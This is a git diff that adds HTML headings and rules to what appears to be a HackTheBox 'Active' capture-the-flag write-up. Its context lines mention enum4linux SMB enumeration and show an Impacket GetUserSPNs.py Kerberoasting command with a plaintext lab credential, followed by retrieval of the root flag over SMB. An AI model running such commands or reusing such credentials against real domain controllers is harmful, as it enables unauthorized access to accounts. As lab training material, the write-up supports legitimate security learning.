@@ -45,6 +45,11 @@ Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r
 
 
 ```
+<hr width="250" size="6">
+
+
+
+<h3>SMB Enumeration</h3>
 
 Enum4linux, is a handy smb enumeration tool, the results here give us a springboard for further enumeration.
 
@@ -138,6 +143,9 @@ Fortunately Impacket has a set of tools that can help.
 
 ```
 
+<h3>Impacket Tools</h3>
+
+
 python GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18
 
 ```
@@ -184,6 +192,8 @@ getting file \administrator\desktop\root.txt of size 34 as root.txt (0.2 KiloByt
 smb: \administrator\desktop\> exit
 
 ```
+
+<hr width="250" size="6">
 
 Looks like we didn't need to actually get a command shell on the target at all to retrieve the
 user and root flags.
